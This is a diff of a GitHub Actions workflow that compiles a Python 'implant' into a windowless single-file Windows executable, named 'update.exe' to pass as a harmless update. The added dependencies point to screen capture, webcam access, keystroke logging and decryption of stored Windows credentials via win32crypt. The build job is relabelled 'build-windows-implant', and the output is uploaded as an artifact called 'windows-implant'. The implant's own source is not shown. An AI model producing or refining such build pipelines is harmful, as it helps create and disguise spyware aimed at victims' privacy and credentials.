@@ -5,12 +5,12 @@ on:
     branches: [ main ]
   pull_request:
     branches: [ main ]
-  workflow_dispatch:  # Allows manual trigger
+  workflow_dispatch:  # Allows manual trigger from GitHub UI
 
 jobs:
-  build-windows:
+  build-windows-implant:
     runs-on: windows-latest
-    timeout-minutes: 30
+    timeout-minutes: 45
 
     steps:
       - name: Checkout repository
@@ -19,17 +19,36 @@ jobs:
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
-          python-version: '3.11'  # Stable version with good PyInstaller support
+          python-version: '3.11'
+          cache: 'pip'
 
-      - name: Install dependencies
+      - name: Upgrade pip & install build tools
         run: |
           python -m pip install --upgrade pip
-          pip install pyinstaller==6.10.0  # Pin a known-good version
-          pip install requests cryptography mss opencv-python pyaudio keyboard pywin32 wmi pillow
+          pip install pyinstaller==6.10.0
 
-      - name: Build with PyInstaller
+      - name: Install implant dependencies
         run: |
-          python implant.py
+          pip install requests cryptography mss opencv-python keyboard pywin32 wmi pillow pycryptodomex
 
+      - name: Build executable with PyInstaller
+        run: |
+          pyinstaller --onefile ^
+                      --noconsole ^
+                      --name "update" ^
+                      --hidden-import win32crypt ^
+                      --hidden-import Cryptodome.Cipher._raw_aes ^
+                      implant.py
 
-     
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: windows-implant
+          path: dist/update.exe
+          retention-days: 30
+          if-no-files-found: error
+
+      - name: Print success message
+        run: |
+          echo "Build complete! Executable: dist/update.exe"
+          echo "Artifact uploaded as 'windows-implant'"
